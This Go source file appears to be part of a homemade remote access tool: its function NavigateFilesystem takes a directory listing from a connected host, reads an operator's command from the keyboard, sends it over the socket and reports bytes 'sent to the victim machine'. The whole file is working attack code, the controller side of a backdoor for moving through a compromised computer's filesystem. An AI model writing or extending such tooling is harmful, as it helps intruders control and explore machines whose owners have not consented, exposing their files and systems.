package Move

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func NavigateFilesystem(connection net.Conn) (err error) {

	ConnectionReader := bufio.NewReader(connection)

	initial_pwd_raw, err := ConnectionReader.ReadString('\n')

	initial_pwd := strings.TrimSuffix(initial_pwd_raw, "\n")

	fmt.Print(initial_pwd, " >> ")

	CommandReader := bufio.NewReader(os.Stdin)

	user_command_raw, err := CommandReader.ReadString('\n')
	if err != nil {
		fmt.Println("[+] Unable to read command")
	}
	nbytes, err := connection.Write([]byte(user_command_raw))
	fmt.Println("[+] ", nbytes, " were sent to the victim machine ")

	new_pwd, err := ConnectionReader.ReadString('\n')
	fmt.Println("[+] Working Directory changed to ", new_pwd)

	return
}
